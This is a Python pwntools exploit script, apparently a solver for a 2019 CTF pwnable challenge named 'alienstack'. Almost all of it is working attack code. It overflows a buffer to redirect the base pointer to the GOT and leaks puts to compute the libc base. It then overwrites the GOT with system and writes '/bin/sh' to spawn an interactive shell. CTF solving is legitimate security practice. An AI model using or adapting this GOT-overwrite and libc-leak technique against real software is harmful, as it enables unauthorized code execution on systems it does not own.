#!/usr/bin/python

'''
Stealien @ 314ckC47
exp.py 2019 kongju keris pwnable task solver
'''

from pwn import *

e = ELF("./alienstack")
l = e.libc
p = process(e.path)

raw_input(">>> ")

''' allocate buffer '''
p.readuntil("sel> ")
p.sendline("0")

''' initialize puts got '''
p.readuntil("sel> ")
p.sendline("2")

''' overwrite base pointer '''
payload = "A"*0x110 + p32(e.got['puts']) + "2222" + "B"*(0x1ff-0x118)
p.readuntil("sel> ")
p.sendline("4")
p.readuntil("input : ")
p.sendline(payload)

''' get leak '''
p.readuntil("sel> ")
p.sendline("2")
l.address = u32(p.readuntil("\n")[0:4]) - l.symbols['puts']
p.readuntil("sel> ")

''' overwrite got '''
p.sendline("3")
p.readuntil(">>> ")
p.sendline(p32(l.symbols['system']))

''' allocate new buffer '''
p.readuntil("sel> ")
p.sendline("0")

''' write /bin/sh to buffer '''
p.readuntil("sel> ")
p.sendline("3")
p.readuntil(">>> ")
p.sendline("/bin/sh")

''' system("/bin/sh"); '''
p.readuntil("sel> ")
p.sendline("2")

''' get shell '''
p.interactive()

p.close(0)